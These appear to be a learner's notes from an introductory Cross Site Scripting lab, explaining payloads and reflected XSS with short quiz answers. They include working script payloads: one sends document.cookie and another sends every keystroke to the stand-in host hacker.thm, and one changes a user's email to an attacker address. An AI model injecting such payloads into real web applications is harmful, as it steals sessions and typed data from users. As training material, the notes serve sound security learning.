# Intro into Cross Site Scripting(XSS)

- XSS is based on JavaScript
- Malicious JavaScript gets injected into a web application with the intention of being executed by other users

## What is Payload?
-  It is the JavaScript code we wish to be executed on the targets computer
- There are two parts to the payload
    - the intention 
        - what you wish the JavaScript to actually do
    - the modification
        - Changes to the code we need to make it execute as every scenario is different

- Some Examples
    - Simplest payload
        ```
        <script>alert('XSS');</script>
        ```
    - Session Stealing
        ```
        <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
        ```
    - Key logger
        ```
        <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
        ```
    - Business Logic
        ```
        <script>user.changeEmail('attacker@hacker.thm');</script>
        ```

**Which document property could contain the user's session token?**
- document.cookie

**Which JavaScript method is often used as a Proof Of Concept?**
- alert


## Reflected XSS
- Occurs when user-supplied data in an http request is included in the webpage source without any validation.

    ![Screenshot](/images/reflectedxss.png)

    ![Screenshot](/images/reflectedxss1.png)

**How to test for Reflected?**
- You'll need to test every possible point of entry; these include:
    - Parameters in the URL Query String
    - URL File Path
    - Sometimes Headers (although unlikely exploitable in practice)